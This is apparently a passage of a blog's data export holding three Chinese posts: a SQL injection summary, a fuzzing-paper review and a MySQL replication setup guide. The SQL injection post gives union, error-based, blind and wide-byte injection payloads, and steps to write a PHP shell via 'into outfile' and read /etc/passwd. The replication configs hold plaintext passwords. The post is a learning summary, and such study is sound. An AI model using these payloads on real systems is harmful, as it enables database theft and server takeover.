where table_schema=database()\n```\n　　不理解的话，可以直接查阅MySQL的information_schema.columns表就会清楚。相关的字段有 table_name，table_schema，column_name。\n　　mysql.user表相应的字段就会有User,Password.\n　　通过这些方式我们大概就可以知道目标数据库，所应有的表信息，就可以进行相应的操作。注释的话比如--,#,/*等\n### MSSQL\n　　在MSSQL下\n　　在开始前我们先来认识下默认系统表—sysdatabases。sysdatabases是MSSQL默认系统表，包含“master”，“msdb”，“mssqlweb”，“empdb”，“model”这五个表，对应的bdid的值为1到5，用户新建的数据库从bdid=6开始，我们可以通过修改bdid的值来得出库名，语句为：\n``` bash\n    select name from master.dbo.sysdatabases where dbid=1\n    union select name from yourdatabasename.dbo.sysobjects where xtype=char(85) and name not in (select top XX name from yourdatabasename.dbo.sysobjects where xtype=char(85))--\n```\n　　上面的XX为数字，即表的序号，为数字。通过这种方式获得表名，接下来就是字段名。\n　　然后分开两个步骤：\n　　１.获得表段的总序号（与id不同）\n``` bash\n    union select id from yourdatabasename.dbo.sysobjects where xtype=char(85) and name not in (select top XX name from yourdatabasename.dbo.sysobjects where xtype=char(85))--\n```\n　　２.根据表的序号一个个列出字段的名字\n``` bash\n    union select name from yourdatabasename.dbo.syscolumns where ID=2073058421 and name not in (select top XX name from yourdatabasename.dbo.syscolumns where ID=2073058421 )--\n```\n　　这里的ID是通过上面的步骤得出来的。\n　　其他技巧在针对字符输入的时候，由于不能使用引号可以采用如下方式:\n``` bash\nhttp://******?ID=1/**/And/**/(/**/select/**/top/**/1/**/name/**/from/**/\n(/**/select/**/row_number()/**/over(/**/order/**/by/**/object_id)/**/as/**/rownumber,\n*/**/from/**/Web.sys.all_objects/**/\nwhere/**/type=char(85))A/**/where/**/rownumber=1)>0 \n```\n　　通过修改rownumber可以获得表名，图上的数据库名为Web，如果是其他表的那就不会一样了\n　　同样用类似的方法可以获得字段\n``` bash\nhttp://××××?ID=1/**/\nAnd/**/(/**/select/**/top/**/1/**/COLUMN_NAME/**/\nfrom(/**/select/**/row_number()/**/over(/**/order/**/by/**/ORDINAL_POSITION)/**/as/**/rownumber,\n*/**/from/**/Web.information_schema.columns/**/\nwhere/**/TABLE_NAME=NCHAR(31649)%2bNCHAR(29702)%2bnchar(24080)%2bnchar(25143))/**/A/**\n/where/**/rownumber=2)>0 \n```\n　　%2b为＋号，由于表名是中文，就会出现上面的样子，不是中文就不会这样。\n### PostgreSQL\n　　在PostgreSQL下\n　　PostgreSQL常用的自带函数有:\n``` bash\n    union select datname from pg_database\n    order by 11                                         #猜字段\n    and (select length(current_database())) between 0,30 　　　　　　#判断数据库长度\n    and(select ascii(substr(current_database(),1,1))) between 0,64　　#判断数据库名的第１位是否是在０,64的ascii码之间。\n    select relname from pg_stat_user_tables limit 1 offset n;\n    and(select count(*) from pg_stat_user_tables) between 0,64　　#判断数据库表数\n    and(select length(relname) from pg_stat_user_tables limit 1 offset 0) between 0,64　　#判断数据库表第一个表的长度\n    and(select ascii(substr(relname,1,1)) from pg_stat_user_tables limit 1 offset 0) between 0,64　　#判断数据库第一张表的第一个字符\n\n```\n　　相应的操作其实和MySQL的操作类似，也可以直接使用MySQL的方式得出相应的数据\n## 有回显的函数错误提示\n　　针对有函数回显，方式就会方便很多。可以通过union select 先得到应有的字段有多少个，如果不是数字型记得把数字换成null。union和union all的区别是,union会自动压缩多个结果集合中的重复结果，而union all则将所有的结果全部显示出来，不管是不是重复。此外猜字段的方式还可以用having '1'='1'的方式来，通过错误提示，间接的得到表的属性字段。其他方式的话，自由发挥。\n　　有时候的回显，并不是直接建立在可视化的模块的界面，而是只有SQL内置报错函数的时候，就需要使用另一种方式，比如：\n```bash\n    and 1=2 union select 1 from (select count(*),concat(floor(rand(0)*2),(the code you put))a from information_schema.tables group by a)b  \n```\n　　这句话的思路是通过floor(rand(0)*2)可能出现1或０的状况在group的时候，会出错，就会直接显示出错的地方，从而显示相应的字段或者数据，使用时，常常会用到limit,当然这种方法也有局限性，比如不能使用update,select into,insert,load_file(),group_concat()等函数，所以使用的时候，就会有相应的限制。得出的错误，会在开头多出一个１，所以去掉就可以了。\n## 无回显的函数错误提示\n　　在没有回显的状态下如何判断存在注入，最直观的情况下，可以用benchmark等类似的延迟函数，看有没有延迟返回，来判断有没有执行SQL语句。\n　　针对返回只有true和false的这种情况，可以通过构造一个判断，来猜表的相应的内容。\n　　比如：\n```bash\n    and left(databse(),1)='1'　　　　　　　　　　　　 #猜数据库名的第一位是１\n    and length(databse())='1'　　　　　　　　　　　   #猜数据库名长度为１\n    and substr(left(role,1),1,1)=char(49) %23　　 　　　#该表的role字段第一位为１,char(49)=1\n```\n　　通过类似这些方式进行猜解。当然为了避免php的GPC函数，需要用到hex函数以及使用ascii码来绕过，比如上图中的３的示例。\n## 加密形式\n　　有些程序员会通过将查询的部分加密，然后传到服务器解密，然后进行查询。常见的方式有base64,以及其他的方式。这时候策略就会和之前一样，只不过，在构造的时候，多一部分编码就可以了。\n## 其他形式\n### 宽字节注入\n　　比如%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\\，变成了 %df\\’，其中\\的十六进制是 %5C ，那么现在 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MYSQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\\’ = %df%5c%27=縗’，有了单引号就好注入了。其实不仅仅是%df可以，其他附近还有一定领域的也可以，可以字节去查一下。\n## 常用函数\n　　MySQL常用的自带函数有:\n``` bash\n    user()                               //显示数据库用户\n    database()                      //当前数据库名\n    version()                        //数据库版本\n    concat()                          //联合数据\n    group_concat()             //多组数据拼接\n    hex()                                 //十六进制编码\n    unhex()                             //十六进制解码\n    load_file()                     //读取文件\n    @@datadir                    //数据路径\n    @@tmpdir                       //临时路径\n    @@version                     //数据库版本\n\n```\n\n　　其他的诸如 @@version_comment，@@version_compile_os，@@warning_count等可以自己去翻一下。\n　　此外用到比如转换类型比如convert( using latin1),以及select file into outfile'/asd/a.a'可以自己去尝试。\n　　MSSQL常用的自带函数有:\n``` bash\n    db_name()                               //显示数据库名\n```\n　　PostgreSQL常用的自带函数有:\n``` bash\n    version()                               //显示数据库版本信息\n\n```\n## shell编写\n``` bash\n    create table test (a text);\n    insert into test(a) values('code that you print');\n    select a from text into outfile 'C://asd//a.php'\n    #读取文件操作\n    create table test (a text);\n    insert into test(a) values(load_file('/etc/passwd'));\n    select a from test \n\n```\n## 预防措施\n　　如果只有int的参数，最好最后直接转换为int类型，这样就可以避免注入，此外针对一些特殊的函数符号进行过滤。其他的一部分，下次会继续讲解，包括绕过等一些方式。\n当然因为篇幅的原因，很多东西没有延伸开来，如果有错误的话欢迎指正。","source":"_posts/SQL注入总结.md","raw":"---\ntitle: SQL注入总结（一）\ndate: 2016-01-19 23:26:39\ncategories:\n- Web安全\ntag:\n- SQL注入\n---\n<h2 id=\"intro\">前言</h2>习惯sqlmap方便的的同时，会不知不觉依赖上，差点忘了根本，遂总结了一下，提醒自己\n\n### 常见的SQL注入形式\n- **读取数据库内容常用方式:**　information_schema，mysql.user\n- **有回显的函数错误提示:** 有SQL错误显示；\n- **无回显的函数错误提示:** 盲注，即没有有SQL错误显示；\n- **加密形式:** SQL加密执行显示;\n- **其他形式:** 宽字节注入等;\n- **预防措施:** 如何避免；\n- **常用函数:** sql自带的函数；\n- **其他:** 补充的地方；\n\n<!-- more -->\n## 读取数据库内容常用方式\n　　数据库都会有内置的表，里面已经包含了所有建表的信息。以MySQL为例。在５版本以上的数据库使用如下语句，就可以直接获得数据库的表的信息。\n### MySQL\n　　比如在MySQL下有\n``` bash\n    select group_concat(distinct table_name) from information_schema.columns where table_schema=database()\n```\n　　不理解的话，可以直接查阅MySQL的information_schema.columns表就会清楚。相关的字段有 table_name，table_schema，column_name。\n　　mysql.user表相应的字段就会有User,Password.\n　　通过这些方式我们大概就可以知道目标数据库，所应有的表信息，就可以进行相应的操作。注释的话比如--,#,/*等\n### MSSQL\n　　在MSSQL下\n　　在开始前我们先来认识下默认系统表—sysdatabases。sysdatabases是MSSQL默认系统表，包含“master”，“msdb”，“mssqlweb”，“empdb”，“model”这五个表，对应的bdid的值为1到5，用户新建的数据库从bdid=6开始，我们可以通过修改bdid的值来得出库名，语句为：\n``` bash\n    select name from master.dbo.sysdatabases where dbid=1\n    union select name from yourdatabasename.dbo.sysobjects where xtype=char(85) and name not in (select top XX name from yourdatabasename.dbo.sysobjects where xtype=char(85))--\n```\n　　上面的XX为数字，即表的序号，为数字。通过这种方式获得表名，接下来就是字段名。\n　　然后分开两个步骤：\n　　１.获得表段的总序号（与id不同）\n``` bash\n    union select id from yourdatabasename.dbo.sysobjects where xtype=char(85) and name not in (select top XX name from yourdatabasename.dbo.sysobjects where xtype=char(85))--\n```\n　　２.根据表的序号一个个列出字段的名字\n``` bash\n    union select name from yourdatabasename.dbo.syscolumns where ID=2073058421 and name not in (select top XX name from yourdatabasename.dbo.syscolumns where ID=2073058421 )--\n```\n　　这里的ID是通过上面的步骤得出来的。\n　　其他技巧在针对字符输入的时候，由于不能使用引号可以采用如下方式:\n``` bash\nhttp://******?ID=1/**/And/**/(/**/select/**/top/**/1/**/name/**/from/**/\n(/**/select/**/row_number()/**/over(/**/order/**/by/**/object_id)/**/as/**/rownumber,\n*/**/from/**/Web.sys.all_objects/**/\nwhere/**/type=char(85))A/**/where/**/rownumber=1)>0 \n```\n　　通过修改rownumber可以获得表名，图上的数据库名为Web，如果是其他表的那就不会一样了\n　　同样用类似的方法可以获得字段\n``` bash\nhttp://××××?ID=1/**/\nAnd/**/(/**/select/**/top/**/1/**/COLUMN_NAME/**/\nfrom(/**/select/**/row_number()/**/over(/**/order/**/by/**/ORDINAL_POSITION)/**/as/**/rownumber,\n*/**/from/**/Web.information_schema.columns/**/\nwhere/**/TABLE_NAME=NCHAR(31649)%2bNCHAR(29702)%2bnchar(24080)%2bnchar(25143))/**/A/**\n/where/**/rownumber=2)>0 \n```\n　　%2b为＋号，由于表名是中文，就会出现上面的样子，不是中文就不会这样。\n### PostgreSQL\n　　在PostgreSQL下\n　　PostgreSQL常用的自带函数有:\n``` bash\n    union select datname from pg_database\n    order by 11                                         #猜字段\n    and (select length(current_database())) between 0,30 　　　　　　#判断数据库长度\n    and(select ascii(substr(current_database(),1,1))) between 0,64　　#判断数据库名的第１位是否是在０,64的ascii码之间。\n    select relname from pg_stat_user_tables limit 1 offset n;\n    and(select count(*) from pg_stat_user_tables) between 0,64　　#判断数据库表数\n    and(select length(relname) from pg_stat_user_tables limit 1 offset 0) between 0,64　　#判断数据库表第一个表的长度\n    and(select ascii(substr(relname,1,1)) from pg_stat_user_tables limit 1 offset 0) between 0,64　　#判断数据库第一张表的第一个字符\n\n```\n　　相应的操作其实和MySQL的操作类似，也可以直接使用MySQL的方式得出相应的数据\n## 有回显的函数错误提示\n　　针对有函数回显，方式就会方便很多。可以通过union select 先得到应有的字段有多少个，如果不是数字型记得把数字换成null。union和union all的区别是,union会自动压缩多个结果集合中的重复结果，而union all则将所有的结果全部显示出来，不管是不是重复。此外猜字段的方式还可以用having '1'='1'的方式来，通过错误提示，间接的得到表的属性字段。其他方式的话，自由发挥。\n　　有时候的回显，并不是直接建立在可视化的模块的界面，而是只有SQL内置报错函数的时候，就需要使用另一种方式，比如：\n```bash\n    and 1=2 union select 1 from (select count(*),concat(floor(rand(0)*2),(the code you put))a from information_schema.tables group by a)b  \n```\n　　这句话的思路是通过floor(rand(0)*2)可能出现1或０的状况在group的时候，会出错，就会直接显示出错的地方，从而显示相应的字段或者数据，使用时，常常会用到limit,当然这种方法也有局限性，比如不能使用update,select into,insert,load_file(),group_concat()等函数，所以使用的时候，就会有相应的限制。得出的错误，会在开头多出一个１，所以去掉就可以了。\n## 无回显的函数错误提示\n　　在没有回显的状态下如何判断存在注入，最直观的情况下，可以用benchmark等类似的延迟函数，看有没有延迟返回，来判断有没有执行SQL语句。\n　　针对返回只有true和false的这种情况，可以通过构造一个判断，来猜表的相应的内容。\n　　比如：\n```bash\n    and left(databse(),1)='1'　　　　　　　　　　　　 #猜数据库名的第一位是１\n    and length(databse())='1'　　　　　　　　　　　   #猜数据库名长度为１\n    and substr(left(role,1),1,1)=char(49) %23　　 　　　#该表的role字段第一位为１,char(49)=1\n```\n　　通过类似这些方式进行猜解。当然为了避免php的GPC函数，需要用到hex函数以及使用ascii码来绕过，比如上图中的３的示例。\n## 加密形式\n　　有些程序员会通过将查询的部分加密，然后传到服务器解密，然后进行查询。常见的方式有base64,以及其他的方式。这时候策略就会和之前一样，只不过，在构造的时候，多一部分编码就可以了。\n## 其他形式\n### 宽字节注入\n　　比如%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\\，变成了 %df\\’，其中\\的十六进制是 %5C ，那么现在 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MYSQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\\’ = %df%5c%27=縗’，有了单引号就好注入了。其实不仅仅是%df可以，其他附近还有一定领域的也可以，可以字节去查一下。\n## 常用函数\n　　MySQL常用的自带函数有:\n``` bash\n    user()                               //显示数据库用户\n    database()                      //当前数据库名\n    version()                        //数据库版本\n    concat()                          //联合数据\n    group_concat()             //多组数据拼接\n    hex()                                 //十六进制编码\n    unhex()                             //十六进制解码\n    load_file()                     //读取文件\n    @@datadir                    //数据路径\n    @@tmpdir                       //临时路径\n    @@version                     //数据库版本\n\n```\n\n　　其他的诸如 @@version_comment，@@version_compile_os，@@warning_count等可以自己去翻一下。\n　　此外用到比如转换类型比如convert( using latin1),以及select file into outfile'/asd/a.a'可以自己去尝试。\n　　MSSQL常用的自带函数有:\n``` bash\n    db_name()                               //显示数据库名\n```\n　　PostgreSQL常用的自带函数有:\n``` bash\n    version()                               //显示数据库版本信息\n\n```\n## shell编写\n``` bash\n    create table test (a text);\n    insert into test(a) values('code that you print');\n    select a from text into outfile 'C://asd//a.php'\n    #读取文件操作\n    create table test (a text);\n    insert into test(a) values(load_file('/etc/passwd'));\n    select a from test \n\n```\n## 预防措施\n　　如果只有int的参数，最好最后直接转换为int类型，这样就可以避免注入，此外针对一些特殊的函数符号进行过滤。其他的一部分，下次会继续讲解，包括绕过等一些方式。\n当然因为篇幅的原因，很多东西没有延伸开来，如果有错误的话欢迎指正。","slug":"SQL注入总结","published":1,"updated":"2016-02-26T11:40:30.990Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciyr5278b001m2xhp4luultz3"},{"title":"Program-Adaptive Mutational Fuzzing","date":"2016-05-10T12:41:10.000Z","_content":"<h2 id=\"intro\">前言</h2>仅记录Program-Adaptive Mutational Fuzzing读后短评\n### 结构\n- **概要** 论文概要；\n- **介绍:** 论文主要内容；\n- **结论:** 论文结论；\n\n<!-- more -->\n## 背景资料\n\n* 单位及作者 ：Sang Kil Cha, Maverick Woo, and David Brumley，Carnegie Mellon University\n* 年份 ：2015\n* 类型：S&P\n\n## 概要\n　　针对黑盒模糊测试所提供的程序和一个种子输入，设计出一个算法尽可能的找出更多的bug，主要是通过给定一个程序和一个种子对，通过白盒元素分析来追踪以检测输入串比特位置之间的依赖。使用这个依赖关系，针对给定的程序和种子对，计算出一个最佳的突变率。最终使用之前3款模糊测试工具，在8款应用使用相同的模糊测试时间测试，比其他模糊测试软件发现的bug数量，平均多发现37.2%。\n## 原文摘要\n　　We present the design of an algorithm to maximize the number of bugs found for black-box mutational fuzzing given a program and a seed input. The major intuition is to leverage white-box symbolic analysis on an execution trace for a given program-seed pair to detect dependencies among the bit positions of an input, and then use this dependency relation to compute a probabilistically optimal mutation ratio for this program-seed pair. Our result is promising: we found an average of 37.2% more bugs than three previous fuzzers over 8 applications using the same amount of fuzzing time.\n\n## 介绍\n　　在文章中介绍了一个名为SYMFUZZ的系统，该系统可以在给定程序和输入种子的情况下，计算出最佳突变率来发现可能的软件崩溃情况。其通过白盒技术分析程序执行情况得出一个有效的突变模糊比率，来增强效果，相较于传统的黑盒突变模糊测试衍生出一个突变率。尽管白盒分析会花去很多时间，但是每个程序种子对，只需要一次预处理步骤。\n　　文章认为最佳突变率可以从输入比特之间的依赖关系进行推导。举个例子，当给出一个程序和一个由32位幻数和两个连续的32位整数所组成的96位的种子，假设这个幻数是42424242（16进制），两个整数都为0.且当输入值为42424242，以及第三个字段为负整数的时候，程序崩溃。因此我们需要翻转第三字段最有效的比特位，不去翻转第一字段的比特位。第二段的比特值并不会影响程序，而第一字段和第三字段存在一种依赖关系。\n　　软件运行分两步：先翻转输入的种子比特位产生测试用例。再评估使用测试用例是否会使程序崩溃。假设预先知道输入种子的类型以及程序是怎么运行。那么模糊软件选择变动的比特位取决于程序，输入种子，突变率有关。\n　　作者的工作：（1）设计出一个数学架构标准化突变模糊测试，对模糊测试比特位之间的关联性进行建模。（2）提出最佳突变率，来尽可能发现更多的bug。（3）结合黑白盒来提高模糊测试的效率。（4）设计出一个突变模糊测试框架。\n## 结论\n　　设计出一个算法，在给定程序以及输入种子会产生一个最佳突变率。结合黑白盒来查找程序的bug。同时将输入位之间的关联所引起的程序崩溃率进行标准化。并且将突变率最优化进行建模，通过执行追踪评估出最佳突变率。通过本程序的数据集，可以找到的bug数量比BFF（一款模糊测试工具）多39.5%，比zzuf多57.9%.。另外经过同样24小时的测试，使用本算法的AFL-FUZZ找到bug的数量比原始多了18.5%。\n\n## 注解\n　　该文侧重于只针对单个输入，对一定长度序列选择最佳的测试用例，针对于协议的漏洞可以收到比较良好的效果。另外比较受欢迎的方式就是白盒测试，做代码审计形成一个语法树，找出存在危险的语句。而对于WEB应用的漏洞，采用这样的方法，就不一定会适合，首先输入的位置较多，其次输入的测试用例不同于本实验的字符串，无法穷举。","source":"_posts/Program-Adaptive-Mutational-Fuzzing.md","raw":"---\ntitle: Program-Adaptive Mutational Fuzzing\ndate: 2016-05-10 20:41:10\ncategories:\n- 论文阅读\ntag:\n- S&P\n---\n<h2 id=\"intro\">前言</h2>仅记录Program-Adaptive Mutational Fuzzing读后短评\n### 结构\n- **概要** 论文概要；\n- **介绍:** 论文主要内容；\n- **结论:** 论文结论；\n\n<!-- more -->\n## 背景资料\n\n* 单位及作者 ：Sang Kil Cha, Maverick Woo, and David Brumley，Carnegie Mellon University\n* 年份 ：2015\n* 类型：S&P\n\n## 概要\n　　针对黑盒模糊测试所提供的程序和一个种子输入，设计出一个算法尽可能的找出更多的bug，主要是通过给定一个程序和一个种子对，通过白盒元素分析来追踪以检测输入串比特位置之间的依赖。使用这个依赖关系，针对给定的程序和种子对，计算出一个最佳的突变率。最终使用之前3款模糊测试工具，在8款应用使用相同的模糊测试时间测试，比其他模糊测试软件发现的bug数量，平均多发现37.2%。\n## 原文摘要\n　　We present the design of an algorithm to maximize the number of bugs found for black-box mutational fuzzing given a program and a seed input. The major intuition is to leverage white-box symbolic analysis on an execution trace for a given program-seed pair to detect dependencies among the bit positions of an input, and then use this dependency relation to compute a probabilistically optimal mutation ratio for this program-seed pair. Our result is promising: we found an average of 37.2% more bugs than three previous fuzzers over 8 applications using the same amount of fuzzing time.\n\n## 介绍\n　　在文章中介绍了一个名为SYMFUZZ的系统，该系统可以在给定程序和输入种子的情况下，计算出最佳突变率来发现可能的软件崩溃情况。其通过白盒技术分析程序执行情况得出一个有效的突变模糊比率，来增强效果，相较于传统的黑盒突变模糊测试衍生出一个突变率。尽管白盒分析会花去很多时间，但是每个程序种子对，只需要一次预处理步骤。\n　　文章认为最佳突变率可以从输入比特之间的依赖关系进行推导。举个例子，当给出一个程序和一个由32位幻数和两个连续的32位整数所组成的96位的种子，假设这个幻数是42424242（16进制），两个整数都为0.且当输入值为42424242，以及第三个字段为负整数的时候，程序崩溃。因此我们需要翻转第三字段最有效的比特位，不去翻转第一字段的比特位。第二段的比特值并不会影响程序，而第一字段和第三字段存在一种依赖关系。\n　　软件运行分两步：先翻转输入的种子比特位产生测试用例。再评估使用测试用例是否会使程序崩溃。假设预先知道输入种子的类型以及程序是怎么运行。那么模糊软件选择变动的比特位取决于程序，输入种子，突变率有关。\n　　作者的工作：（1）设计出一个数学架构标准化突变模糊测试，对模糊测试比特位之间的关联性进行建模。（2）提出最佳突变率，来尽可能发现更多的bug。（3）结合黑白盒来提高模糊测试的效率。（4）设计出一个突变模糊测试框架。\n## 结论\n　　设计出一个算法，在给定程序以及输入种子会产生一个最佳突变率。结合黑白盒来查找程序的bug。同时将输入位之间的关联所引起的程序崩溃率进行标准化。并且将突变率最优化进行建模，通过执行追踪评估出最佳突变率。通过本程序的数据集，可以找到的bug数量比BFF（一款模糊测试工具）多39.5%，比zzuf多57.9%.。另外经过同样24小时的测试，使用本算法的AFL-FUZZ找到bug的数量比原始多了18.5%。\n\n## 注解\n　　该文侧重于只针对单个输入，对一定长度序列选择最佳的测试用例，针对于协议的漏洞可以收到比较良好的效果。另外比较受欢迎的方式就是白盒测试，做代码审计形成一个语法树，找出存在危险的语句。而对于WEB应用的漏洞，采用这样的方法，就不一定会适合，首先输入的位置较多，其次输入的测试用例不同于本实验的字符串，无法穷举。","slug":"Program-Adaptive-Mutational-Fuzzing","published":1,"updated":"2016-05-10T12:54:35.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciyr5278e001q2xhpx1j3we61"},{"title":"MySQL主从库相关信息整理","date":"2016-04-18T13:41:21.000Z","_content":"<h2 id=\"intro\">前言</h2>仅记录在主从库遇到的坑\n### 相关的配置方式\n- **服务创建:** 基本配置；\n- **注意事项:** 一些细节注意的地方；\n- **主从原理:** 基本的原理解析；\n\n<!-- more -->\n## 服务创建\n  需要主库以及从库\n### 相关步骤\n* 创建用户\n\n``` bash\n        GRANT REPLICATION SLAVE ON *.* TO 'slave'@'localhost' IDENTIFIED BY '123456'  \n```\n\n* 修改MySQL配置文件\n\na)master\n    \n``` bash\n# vi /etc/my.cnf   \n    =============   \n    [mysqld]   \n    server-id = 1   \n    log_bin = mysql-bin   \n    binlog-do-db = test # 多个写多行   \n    binlog-ignore-db = mysql #多个写多行   \n    max_binlog_size = 500M\n    binlog_cache_size = 128K\n    log-slave-updates\n    expire_logs_day=2\n    binlog_format=\"MIXED\"\n    =============   \n\n```\n\nb)slave，配置每个slave\n\n``` bash\n    # vi /etc/my.cnf   \n    [mysqld]   \n    server-id = 2   \n    log_bin = mysql-bin   \n    replicate-do-db = test   \n    replicate-ignore-db = mysql   \n    replicate-ignore-db = information_schema   \n    slave-skip-errors=1007,1008,1053,1062,1213,1158,1159\n    master-info-file = /home/mysql/logs/master.info\n    relay-log = /home/mysql/logs/relay-bin\n    relay-log-index = /home/mysql/logs/relay-bin.index\n    relay-log-info-file = /home/mysql/logs/relay-log.info\n    =============   \n         \n```\n\n* 启动slave后执行(各台slave操作类似)\n\n``` bash\n    CHANGE MASTER TO MASTER_HOST = ’127.0.0.1', MASTER_USER = 'slave', MASTER_PASSWORD = '123456', MASTER_LOG_FILE = 'mysql-bin.000001', MASTER_LOG_POS = 107; \n    //（通过在master上SHOW MASTER STATUS 来得到MASTER_LOG_FILE和MASTER_LOG_POS的值）   \n    SLAVE START;   \n    SHOW SLAVE STATUS ; //查看是否同步上   \n```\n\n* 登录master，增删改数据后看下各slave是否正常同步到\n\n## 注意事项\n　　在同步时候，有时候会发现经常1062的错误，可以在配置的时候，添加配置项skip-error项。如果修改了连接主库相关信息，重启之前一定要删除master.info文件，否则重启之后由于连接信息改变从库而不会自动连接主库，造成同步失败。此文件是保存连接主库信息的。\n\n## 主从原理\n### Replication 线程\n　　Mysql的 Replication 是一个异步的复制过程（mysql5.1.7以上版本分为异步复制和半同步两种模式），从一个 Mysql instace(我们称之为 Master)复制到另一个Mysql instance(我们称之 Slave)。在 Master 与 Slave 之间的实现整个复制过程主要由三个线程来完成，其中两个线程(Sql线程和IO线程)在 Slave端，另外一个线程(IO线程)在 Master 端。要实现 MySQL 的 Replication ，首先必须打开 Master 端的Binary Log(mysql-bin.xxxxxx功能，否则无法实现。因为整个复制过程实际上就是Slave从Master端获取该日志然后再在自己身上完全 顺序的执行日志中所记录的各种操作。打开 MySQL 的 Binary Log 可以通过在启动 MySQL Server 的过程中使用 “—log-bin” 参数选项，或者在 my.cnf 配置文件中的 mysqld 参数组([mysqld]标识后的参数部分)增加 “log-bin” 参数项。\n\n### MySQL 复制的基本过程如下\n　　1. Slave 上面的IO线程连接上 Master，并请求从指定日志文件的指定位置(或者从最开始的日志)之后的日志内容；\n　　2. Master 接收到来自 Slave 的 IO 线程的请求后，通过负责复制的 IO 线程根据请求信息读取指定日志指定位置之后的日志信息，返回给 Slave 端的 IO 线程。返回信息中除了日志所包含的信息之外，还包括本次返回的信息在 Master 端的 Binary Log 文件的名称以及在 Binary Log 中的位置；\n　　3. Slave 的 IO 线程接收到信息后，将接收到的日志内容依次写入到 Slave 端的Relay Log文件(mysql-relay-bin.xxxxxx)的最末端，并将读取到的Master端的bin-log的文件名和位置记录到master- info文件中，以便在下一次读取的时候能够清楚的高速Master“我需要从某个bin-log的哪个位置开始往后的日志内容，请发给我”\n　　4. Slave 的 SQL 线程检测到 Relay Log 中新增加了内容后，会马上解析该 Log 文件中的内容成为在 Master 端真实执行时候的那些可执行的 Query 语句，并在自身执行这些 Query。这样，实际上就是在 Master 端和 Slave 端执行了同样的 Query，所以两端的数据是完全一样的\n\n## 附录\n### MySQL 的主从配置文件\n相关内容仅供参考:\n主库配置文件\n``` bash\n# Example MySQL config file for medium systems.\n#\n# This is for a system with little memory (32M - 64M) where MySQL plays\n# an important part, or systems up to 128M where MySQL is used together with\n# other programs (such as a web server)\n#\n# You can copy this file to\n# /etc/my.cnf to set global options,\n# mysql-data-dir/my.cnf to set server-specific options (in this\n# installation this directory is C:\\mysql\\data) or\n# ~/.my.cnf to set user-specific options.\n#\n# In this file, you can use all long options that a program supports.\n# If you want to know which options a program supports, run the program\n# with the \"--help\" option.\n\n# The following options will be passed to all MySQL clients\n[client]\nport        = 3306\n\nsocket = \"D:\\mysql_main\\mysql-5.7.13-winx64\"\n\n\n\n[mysql]\n\nno-auto-rehash\n# Remove the next comment character if you are not familiar with SQL\n#safe-updates\n\n\n[mysqld]\nserver-id=5\nport=3306\nlog-bin=mysql-bin\nbinlog-do-db=t_qcpj\nbinlog_format=\"MIXED\"\nsocket = \"D:/mysql_main/mysql-5.7.13-winx64/mysql.sock\"\nexplicit_defaults_for_timestamp = TRUE\ncharacter-set-server=utf8\nbasedir=D:\\mysql_main\\mysql-5.7.13-winx64\ndatadir=D:\\mysql_main\\mysql-5.7.13-winx64\\data\n\nlog-output=FILE\ngeneral-log=0\ngeneral_log_file=\"WIN-KGGGQSE2NIE.log\"\nslow-query-log=1\nslow_query_log_file=\"WIN-KGGGQSE2NIE-slow.log\"\nlong_query_time=10\nlog-error=\"mysqlerr.log\"\nft_min_word_len=1\npid_file  = \"mysql.pid\"\ndefault-storage-engine=INNODB\nmax_binlog_size=500M\nbinlog_cache_size=128K\nbinlog_ignore_db=mysql\nlog-slave-updates\nmax_connections=151\nquery_cache_size=0\ntmp_table_size=310M\ntable_open_cache=2000\nthread_cache_size=10\nmyisam_max_sort_file_size=100G\nsql-mode=\"STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\"\nmyisam_sort_buffer_size=608M\nkey_buffer_size=8M\nread_buffer_size=64K\nread_rnd_buffer_size=256K\nsort_buffer_size=256K\n\ninnodb_flush_log_at_trx_commit=1\ninnodb_log_buffer_size=1M\ninnodb_buffer_pool_size=8M\ninnodb_log_file_size=48M\ninnodb_thread_concurrency=17\ninnodb_autoextend_increment=64\ninnodb_buffer_pool_instances=8\n\ninnodb_concurrency_tickets=5000\ninnodb_old_blocks_time=1000\ninnodb_open_files=300\ninnodb_stats_on_metadata=0\ninnodb_file_per_table=1\ninnodb_checksum_algorithm=0\nback_log=80\nflush_time=0\njoin_buffer_size=256K\nmax_allowed_packet=4M\nmax_connect_errors=100\nopen_files_limit=4161\nquery_cache_type=0\ntable_definition_cache=1400\nbinlog_row_event_max_size=8K\nsync_master_info=10000\n\n# If the value of this variable is greater than 0, the MySQL server synchronizes its relay log to disk.\n# (using fdatasync()) after every sync_relay_log writes to the relay log.\nsync_relay_log=10000\n\n# If the value of this variable is greater than 0, a replication slave synchronizes its relay-log.info file to disk.\n# (using fdatasync()) after every sync_relay_log_info transactions.\nsync_relay_log_info=10000\n\n# Load mysql plugins at start.\"plugin_x ; plugin_y\".\n# plugin_load\n\n# MySQL server's plugin configuration.\n# loose_mysqlx_port=33060\n\n[mysqldump]\nquick\nmax_allowed_packet = 16M\n\n[isamchk]\nkey_buffer       = 20M\nsort_buffer_size = 20M\nread_buffer      = 2M\nwrite_buffer     = 2M\n\n[myisamchk]\nkey_buffer       = 20M\nsort_buffer_size = 20M\nread_buffer      = 2M\nwrite_buffer     = 2M\n\n[mysqlhotcopy]\ninteractive-timeout\n\n  \n```\n\n从库配置文件\n\n``` bash\n[client]\nport        = 3307\nsocket = \"D:\\mysql_sub\\mysql-5.7.13-winx64\"\n\n[client]\nuser = root \npassword =China1000\n[mysql]\nno-auto-rehash\n\n[mysqld]\nserver-id =3\nlog-bin=mysql-bin\nreplicate-do-db=t_qcpj\nreplicate-ignore-db=mysql\nslave-skip-errors=1007,1008,1053,1062,1213,1158,1159\nbinlog_format=mixed\nport=3307\nsocket = \"D:/mysql_sub/mysql-5.7.13-winx64/mysql.sock\"\nexplicit_defaults_for_timestamp = TRUE\nbasedir=D:/mysql_sub/mysql-5.7.13-winx64\nlog-error=\"mysqlerr.log\"\ndatadir=D:/mysql_sub/mysql-5.7.13-winx64/data\npid_file  = 